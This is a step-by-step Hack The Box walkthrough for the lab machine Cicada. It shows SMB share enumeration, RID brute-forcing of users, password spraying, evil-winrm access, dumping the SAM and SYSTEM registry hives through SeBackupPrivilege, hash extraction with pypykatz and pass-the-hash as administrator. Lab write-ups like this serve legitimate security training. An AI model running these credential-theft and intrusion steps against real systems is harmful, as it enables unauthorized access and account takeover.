# Hack The Box (HTB) - Cicada Walkthrough

## Overview
This guide walks through the process of connecting to a Hack The Box (HTB) machine named **Cicada**, performing enumeration, exploiting SMB shares, and ultimately gaining root access.

## Prerequisites
- OpenVPN installed
- nmap
- smbclient
- evil-winrm
- pypykatz
- netexec

## Steps

### 1. Connecting to HTB
Download and connect to the VPN:
```sh
ls
sudo openvpn <path_to_vpn_file>
```

![image](https://github.com/user-attachments/assets/aef25dc9-ed8f-4d1d-aad2-d6ec0dd95c28)



![image](https://github.com/user-attachments/assets/20d74be9-6273-4c5b-8da1-6e8196bd212c)



![image](https://github.com/user-attachments/assets/c5fc1511-7f98-4bc2-a523-ac7ba34d104d)




### 2. Initial Enumeration
Scan the target machine using **nmap**:
```sh
nmap -sV -sC -T4 -oN Cicada.txt <ip.address>
```


![image](https://github.com/user-attachments/assets/5f0ca176-e151-454c-8207-b92efd203319)



#### Flags Explanation:
- `-sV` : Service/version detection
- `-sC` : Default script scanning
- `-T4` : Aggressive scanning mode
- `-oN Cicada.txt` : Save output to a file

### 3. Add Host to `/etc/hosts`
```sh
echo "<ip.address> cicada.htb CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```
Verify the entry:
```sh
cat /etc/hosts
```


![image](https://github.com/user-attachments/assets/17892968-1054-4196-8af8-34d2545100ec)



### 4. SMB Enumeration
List available shares:
```sh
smbclient -N -L //cicada.htb
```
If `smbclient` is not installed:
```sh
sudo apt install smbclient
```

![image](https://github.com/user-attachments/assets/20fcb8eb-9522-4f4c-aa16-b63c4b26c552)



Access the **HR** share:
```sh
smbclient -N //cicada.htb/HR
```
Download files:
```sh


![image](https://github.com/user-attachments/assets/bb468876-768a-4d29-a212-19c309441d05)


smb: \> get "Notice from HR.txt"
cat 'Notice from HR.txt'
```

### 5. SMB User Enumeration
Brute-force user enumeration:
```sh
nxc smb cicada.htb -u 'anonymous' -p '' --rid-brute 3000
```


![image](https://github.com/user-attachments/assets/2a0e6759-ccd7-4531-a1de-6a9d5fc332d0)


Extract usernames and save them:
```sh
nano users.txt
```


![image](https://github.com/user-attachments/assets/404b6a40-3634-46b1-86b2-bdce45154a28)


Check for valid credentials:
```sh
nxc smb cicada.htb -u users.txt -p '<password_from_notice>'
```


![image](https://github.com/user-attachments/assets/37ea261d-801d-46ad-bf1a-c35b7421eaa5)


Confirm valid user:
```sh
nxc smb cicada.htb -u 'cicada.htb\michael.wrightson' -p '<password>' --users
```




![image](https://github.com/user-attachments/assets/1c535d7f-ad2b-4114-986a-f495c4fc1514)



### 6. Further SMB Access
Login with the new credentials:
```sh
smbclient //cicada.htb/DEV -U 'cicada.htb\david.orelious'
```


![image](https://github.com/user-attachments/assets/3aecd667-2466-4029-9b48-90ed072bebe8)


Download the script:
```sh
get Backup_script.ps1
cat Backup_script.ps1
```


![image](https://github.com/user-attachments/assets/289762d9-3484-41c3-9783-bbf2830c17a7)



### 7. Remote Access via Evil-WinRM
```sh
evil-winrm -i cicada.htb -u '<username>' -p '<password>'
```


![image](https://github.com/user-attachments/assets/23849e80-0289-4d91-93a5-bb4eb74b1d53)


Verify access:
```sh
whoami
ls
```



![image](https://github.com/user-attachments/assets/b47a2482-6572-47a0-8476-34cdec9de80f)




### 8. Extracting Sensitive Files
Move directories:
```sh
cd ..
cd Desktop
```


![image](https://github.com/user-attachments/assets/73afa306-68c1-483b-9d9c-3dd873393a8b)



Read **user.txt**:
```sh
type .\user.txt
```


![image](https://github.com/user-attachments/assets/f544299b-9fee-45f0-a072-8a77054331ad)


### 9. Privilege Escalation
Check privileges:
```sh
whoami /priv
```


![image](https://github.com/user-attachments/assets/6540a236-d3d5-428d-8f5d-f3b6a71c803a)



If **SeBackupPrivilege** is enabled, exploit it:
```sh
mkdir C:\Temp
cd C:\Temp
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
```

![image](https://github.com/user-attachments/assets/41b017e7-3257-4ad3-9bd8-9b009f47609f)

![image](https://github.com/user-attachments/assets/d479b538-a7d0-4a56-b51f-37a778dfae80)



Download registry hives:
```sh
download sam
download system
```

![image](https://github.com/user-attachments/assets/c89c0c33-bacb-4c3b-87db-54e6cd562f57)


### 10. Cracking the Administrator Password
Check if `pypykatz` is installed:
```sh
pip show pypykatz
```
![image](https://github.com/user-attachments/assets/ab18db3c-48a3-41bb-9319-6fe9c261726e)


Extract password hashes:
```sh
pypykatz registry --sam sam system
```

![image](https://github.com/user-attachments/assets/b53b2efd-aaee-4f76-bc5f-c179d7c78e8c)


Find the **Administrator** hash and use it for authentication:
```sh
evil-winrm -i cicada.htb -u administrator -H <hash_value>
```

![image](https://github.com/user-attachments/assets/2b9cdad2-a2f2-49d9-838f-ee1901d3e941)


Verify access:
```sh
whoami
```
Retrieve the final flag:
```sh
cd ..
cd Desktop
ls
type .\root.txt
```
![image](https://github.com/user-attachments/assets/a2a157f2-8201-4e1d-a05f-cfe566a05746)


## Conclusion
By following these steps, we successfully exploited SMB shares, retrieved credentials, escalated privileges, and gained full system access on Cicada.
